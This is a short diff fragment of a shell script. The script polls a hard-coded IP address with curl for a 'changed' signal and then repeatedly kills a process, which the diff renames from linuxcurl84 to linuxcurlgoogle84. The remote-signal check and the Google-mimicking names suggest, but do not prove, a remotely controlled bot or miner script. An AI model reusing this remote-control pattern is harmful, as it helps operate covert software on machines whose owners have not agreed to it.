@@ -5,13 +5,13 @@ string8474=$(curl -s http://154.127.52.52/googlelinux84.php | cat)
 
 if [[ $string8474 == *"changed"* ]]; then
 
-pkill -f linuxcurl84
+pkill -f linuxcurlgoogle84
 
-pkill -f linuxcurl84
+pkill -f linuxcurlgoogle84
 
-pkill -f linuxcurl84
+pkill -f linuxcurlgoogle84
 
-pkill -f linuxcurl84
+pkill -f linuxcurlgoogle84
 
 echo "google84"
 
